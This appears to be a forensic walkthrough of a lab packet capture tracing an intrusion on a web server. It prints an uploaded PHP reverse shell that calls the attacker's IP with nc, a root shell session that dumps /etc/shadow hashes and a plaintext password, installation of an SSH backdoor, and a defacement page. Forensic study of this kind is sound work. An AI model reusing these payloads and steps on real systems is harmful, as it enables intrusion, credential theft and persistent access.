
To get only the traffic to and from the attacker we filter on:
`(tcp || udp) && (ip.src ==  192.168.170.145 || ip.dst == 192.168.170.145)`

## Communication on port 80 HTTP

```http
GET /development/ HTTP/1.1
...
```

response
```http
<!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->
<!-- TODO add downloading of your overpass files -->
      <form action="upload.php" method="post" enctype="multipart/form-data">
        <div class="formElem"><label for="fileToUpload">Upload your .overpass file for cloud synchronisation</label><input type="file"
            name="fileToUpload" id="fileToUpload"></div>
        <div class="formElem"><input type="submit" value="Upload File" name="submit"></div>
      </form>

```

```http
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1
-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"
Upload File
-----------------------------1809049028579987031515260006--
```

```http
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 39
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The file payload.php has been uploaded.
```

```http
GET /development/uploads/ HTTP/1.1
...
```

```http
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 472
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html;charset=UTF-8

_oÚ0Åßû)îü0mÄIè¿¬'F¨D!*TÓ4íÁ
±ìÈ1lìÓ×!LM'X·§ØÊïsíKÞ$³áâk:Ï»	¤&ã! Æ_úCEÒþè{!ÜJÅJGSDÏHa×%=RÆÝ¶t¬¸ø	z	(uµÊâMUjÆk[ÈáCÉ4ß5rÁk¥ØÃ²½B³4Ø¶¬+#«+D\¯ 6y°ÌµªqV2õèä+m¾³ïÃ¶hª)aP±ÑÇa<½Å	¢S¶³ãÌcNXma¹\JÁOÂóË_§IDYY©Õ3]ÄnÔ\uÅ\Ö 0]ªEøkÝ`ùf¤ûÑtïÛðFâÙÝ@4eÆ- FäVÝÁg[ôVeuuó{F®
(@ÿa}£þ¡ºî]gú®Ø®y4^U8¡Î¦kø¡ú=ÿªúúç§¢DÑ_¢üã]áÃ+&s#ê*Þ¹Fðî!Û(»ysa¶Â³D¡\^{Áï¤ÚX¸ö]¢Ýýd>EÙ
```

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /development/uploads</title>
 </head>
 <body>
<h1>Index of /development/uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/development/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="payload.php">payload.php</a></td><td align="right">2020-07-21 20:34  </td><td align="right"> 99 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.170.159 Port 80</address>
</body></html>
```

```http
GET /development/uploads/payload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/uploads/
Connection: keep-alive
Upgrade-Insecure-Requests: 1


```

## Communication on port 4242

/bin/sh: 0: can't access tty; job control turned off
$ 

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
ssh
$

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@overpass-production:/var/www/html/development/uploads$ 

ls -lAh

total 8.0K

-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php

www-data@overpass-production:/var/www/html/development/uploads$ 

.overpass

,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.

www-data@overpass-production:/var/www/html/development/uploads$ 

su james

Password: 

whenevernoteartinstant

james@overpass-production:/var/www/html/development/uploads$ 

cd ~

james@overpass-production:~$ 

sudo -l
[sudo] password for james: 

whenevernoteartinstant

```sh
Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$ 
```

sudo cat /etc/shadow

```sh
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

james@overpass-production:~$ 

git clone https://github.com/NinjaJc01/ssh-backdoor

Cloning into 'ssh-backdoor'...

remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        

remote: Counting objects:  11% (2/18)        
remote: Counting objects:  16% (3/18)        
remote: Counting objects:  22% (4/18)        
remote: Counting objects:  27% (5/18)        
remote: Counting objects:  33% (6/18)        
remote: Counting objects:  38% (7/18)        
remote: Counting objects:  44% (8/18)        
remote: Counting objects:  50% (9/18)        
remote: Counting objects:  55% (10/18)        
remote: Counting objects:  61% (11/18)        
remote: Counting objects:  66% (12/18)        
remote: Counting objects:  72% (13/18)        
remote: Counting objects:  77% (14/18)        
remote: Counting objects:  83% (15/18)        
remote: Counting objects:  88% (16/18)        
remote: Counting objects:  94% (17/18)        
remote: Counting objects: 100% (18/18)        
remote: Counting objects: 100% (18/18), done.        

remote: Compressing objects:   6% (1/15)        
remote: Compressing objects:  13% (2/15)        
remote: Compressing objects:  20% (3/15)        
remote: Compressing objects:  26% (4/15)        
remote: Compressing objects:  33% (5/15)        
remote: Compressing objects:  40% (6/15)        
remote: Compressing objects:  46% (7/15)        
remote: Compressing objects:  53% (8/15)        
remote: Compressing objects:  60% (9/15)        
remote: Compressing objects:  66% (10/15)        
remote: Compressing objects:  73% (11/15)        
remote: Compressing objects:  80% (12/15)        
remote: Compressing objects:  86% (13/15)        
remote: Compressing objects:  93% (14/15)        
remote: Compressing objects: 100% (15/15)        
remote: Compressing objects: 100% (15/15), done.        

Unpacking objects:   5% (1/18)   
Unpacking objects:  11% (2/18)   
Unpacking objects:  16% (3/18)   
Unpacking objects:  22% (4/18)   
Unpacking objects:  27% (5/18)   
Unpacking objects:  33% (6/18)   
Unpacking objects:  22% (7/18)   

 remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0        

Unpacking objects:  44% (8/18)   
Unpacking objects:  50% (9/18)   
Unpacking objects:  55% (10/18)   
Unpacking objects:  61% (11/18)   

Unpacking objects:  66% (12/18)   
Unpacking objects:  72% (13/18)   
Unpacking objects:  77% (14/18)   
Unpacking objects:  83% (15/18)   
Unpacking objects:  88% (16/18)   
Unpacking objects:  94% (17/18)   
Unpacking objects: 100% (18/18)   
Unpacking objects: 100% (18/18), done.

james@overpass-production:~$ 

cd ssh-backdoor

james@overpass-production:~/ssh-backdoor$ 

ssh-keygen

Generating public/private rsa key pair.

Enter file in which to save the key (/home/james/.ssh/id_rsa): 

id_rsa


Enter passphrase (empty for no passphrase): 



Enter same passphrase again: 

Your identification has been saved in id_rsa.

Your public key has been saved in id_rsa.pub.

The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production

The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+

james@overpass-production:~/ssh-backdoor$ 

chmod +x backdoor

james@overpass-production:~/ssh-backdoor$ 

./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222

## Communication on 2222

SSH-2.0-OpenSSH_8.2p1 Debian-4

)ºH)nE4C×@@kÀ¨ªÀ¨ª®ìòøUâª6Vã{þ^#
5RéÂcüÀÔú$Îîü9²¨N¿qcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1ssh-rsaUaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctrUaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctrBhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96nonenoneb*2YÊcZHDà

)n)ºHE&Ã@@7À¨ªÀ¨ªìò®6Vã{øUäªõÜ
Âc5Réä
þþçãÃ ®êOË72
ñcurve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-côrsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,sk-ecdsa-sha2-nistp256-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com,ssh-ed25519,sk-ssh-ed25519@openssh.comlchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.comlchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.comÕumac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1Õumac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1none,zlib@openssh.com,zlibnone,zlib@openssh.com,zlib

...

## Communication on 8080 with some http in there

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:40 GMT
Content-type: image/png
Content-Length: 60102
Last-Modified: Tue, 21 Jul 2020 19:33:27 GMT

PNG sent to server


GET /index.html HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:46 GMT
Content-type: text/html
Content-Length: 815
Last-Modified: Tue, 21 Jul 2020 19:33:39 GMT

```html
<head>
    <title>LOL Hacked</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: black;
            color: limegreen;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
        }

        img {
            position: fixed;
            left: 50%;
            bottom: 0px;
            transform: translate(-50%, -0%);
            margin: 0 auto;
            max-width: 100vw;
            max-height: 100vh;
            margin: auto;
        }
    </style>
</head>

<body>
    <div>
        <h1>H4ck3d by CooctusClan</h1>
    </div>
    <div>
        <p>Secure your servers!</p>
    </div>
    <div><img src="cooctus.png"></div>
</body>
```

LOL Hacked
H4ck3d by CooctusClan
Secure your servers!
cooctus.png

```http
GET / HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "97f-5aae9add6c459-gzip"


```

```http
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:22 GMT
ETag: "32f-5aaf99ab26dad-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 385
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

uRANÃ0¼WêL¥

¸K/=Tpà½IL;²7m"Ô¿ã4
Óî!òxvfmg(O§â*AÒÍû¬)ÛOÂaçD[ì~@_æù:ã¾r0Èi%dÛnCÞ`» '´ VÚÖÁË_qæ¦F7Ç$x<ÓRHQAaGsakIÝÜ\BëqýVÀB«¸·j*ßà³±(ò.`î Ðu¹/¯¡ÅJQ¨
éäDUøïSk+ä¢îYKÈÝÔçhî?FÔUL¢Ú¿ªl®#KIîç° A4¿÷º+j
áfG6¨ÿm°Ë,£h·¿@ ¾¼âí9Ná	Çô$á)rnÙ'hL»_ÙJÊeº~bÛGN²Î%G3lìJRåäËQ5¾¼N?5HçBG,{õ5mÒÿ,kØë
ÃjUÌÒ±/	gý>WÖ/
```

```http
GET /cooctus.png HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/
Connection: keep-alive


```

cooctus.png

```http
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:31 GMT
ETag: "eac6-5aaf99b361586"
Accept-Ranges: bytes
Content-Length: 60102
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/png

PNG

...
```

